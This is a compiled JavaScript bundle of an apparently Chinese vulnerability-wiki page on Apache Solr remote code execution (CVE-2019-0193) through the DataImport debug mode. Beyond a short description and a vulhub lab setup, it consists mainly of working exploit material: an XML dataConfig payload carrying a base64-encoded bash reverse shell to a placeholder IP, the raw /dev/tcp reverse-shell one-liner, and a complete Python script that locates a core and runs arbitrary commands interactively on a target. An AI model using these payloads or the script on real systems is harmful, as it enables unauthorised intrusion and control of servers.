import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,[s("2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与"),n("code",null,"data-config.xml"),s(" 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 "),n("code",null,"dataConfig"),s(" 参数中可以包含 script 恶意脚本导致远程代码执行。")],-1),d=n("p",null,"参考阅读：",-1),k={href:"https://blog.csdn.net/whatday/article/details/106959989?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4.channel_param",target:"_blank",rel:"noopener noreferrer"},m=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr &lt; 8.2.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>https://github.com/vulhub/vulhub.git
<span class="token builtin class-name">cd</span> vulhub/solr/CVE-2019-0193
<span class="token function">docker-compose</span> build
<span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>

<span class="token comment"># 创建一个solr核心test</span>
<span class="token function">docker-compose</span> <span class="token builtin class-name">exec</span> solr <span class="token function">bash</span> bin/solr create_core <span class="token parameter variable">-c</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-d</span> example/example-DIH/solr/db
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),v={href:"http://xxx.xxx.xxx.xxx:8983/solr/",target:"_blank",rel:"noopener noreferrer"},b=e(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091157982.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>点击刚刚创建的test进入调试</p><p><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091158371.png" alt="" loading="lazy">将下面的POC代码填入 Debug-Mode 中</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>URLDataSource<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}&quot;);
          }
  ]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stackoverflow<span class="token punctuation">&quot;</span></span>
            <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://stackoverflow.com/feeds/tag/solr<span class="token punctuation">&quot;</span></span>
            <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>XPathEntityProcessor<span class="token punctuation">&quot;</span></span>
            <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/feed<span class="token punctuation">&quot;</span></span>
            <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script:poc<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>bash <span class="token operator">-</span>i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token operator">/</span><span class="token number">9999</span> <span class="token number">0</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span>
直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>点击EXecute执行代码</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091158409.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091158536.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功反弹shell</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>POC不支持反弹shell，如需反弹shell，请按如上步骤反弹shell
<span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment"># author : PeiQi</span>
<span class="token comment"># from   : http://wiki.peiqi.tech</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: Apache Solr &lt; 8.2.0            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式: python3 CVE-2019-0193.py       \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mCmd    &gt;&gt;&gt; whoami(命令执行)              \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    core_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>core_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        core_name <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;status&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功获得core_name,Url为：&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/config\\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> core_name
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    mode_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/admin/mbeans?cat=QUERY&amp;wt=json&quot;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>mode_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>
    mode <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;solr-mbeans&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;/dataimport&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;class&#39;</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">&quot;org.apache.solr.handler.dataimport.DataImportHandler&quot;</span> <span class="token keyword">in</span> mode<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 目标Url,Dataimport模块开启\\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标Url,Dataimport模块未开启\\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_3</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core_name <span class="token operator">+</span> <span class="token string">&quot;/dataimport&quot;</span>

    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;Host&#39;</span><span class="token punctuation">:</span> target_url<span class="token punctuation">,</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept-Language&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept-Encoding&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;zip, deflate&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-type&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requested-With&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;XMLHttpRequest&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Length&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;1007&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Connection&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span>
    <span class="token punctuation">}</span>

    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
        command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test&amp;name=dataimport&amp;dataConfig=
        &lt;dataConfig&gt;
          &lt;dataSource type=&quot;URLDataSource&quot;/&gt;
          &lt;script&gt;&lt;![CDATA[
                  function poc(row){
         var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;%s&quot;).getInputStream()));
        var result = [];
        while(true) {
        var oneline = bufReader.readLine();
        result.push( oneline );
        if(!oneline) break;
        }
        row.put(&quot;title&quot;,result.join(&quot;\\\\n\\\\r&quot;));
        return row;
        }
          ]]&gt;&lt;/script&gt;
                &lt;document&gt;
                     &lt;entity name=&quot;entity1&quot;
                             url=&quot;https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml&quot;
                             processor=&quot;XPathEntityProcessor&quot;
                             forEach=&quot;/RDF/item&quot;
                             transformer=&quot;script:poc&quot;&gt;
                                &lt;field column=&quot;title&quot; xpath=&quot;/RDF/item/title&quot; /&gt;
                     &lt;/entity&gt;
                &lt;/document&gt;
        &lt;/dataConfig&gt;
        &quot;&quot;&quot;</span> <span class="token operator">%</span> cmd

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        get_message <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;documents&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        message <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>get_message<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;title&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m&quot;</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 代码执行失败 \\033[0m&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    core_name <span class="token operator">=</span> POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mCmd &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            POC_3<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091159388.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14);function g(q,h){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",k,[s("apache solr远程代码执行漏洞(cve-2019-0193)"),t(a)])])]),m,n("p",null,[s("访问 "),n("a",v,[s("http://xxx.xxx.xxx.xxx:8983/solr/"),t(a)]),s(" 正常即可")]),b])}const f=p(l,[["render",g],["__file","Apache Solr 远程执行漏洞 CVE-2019-0193.html.vue"]]);export{f as default};
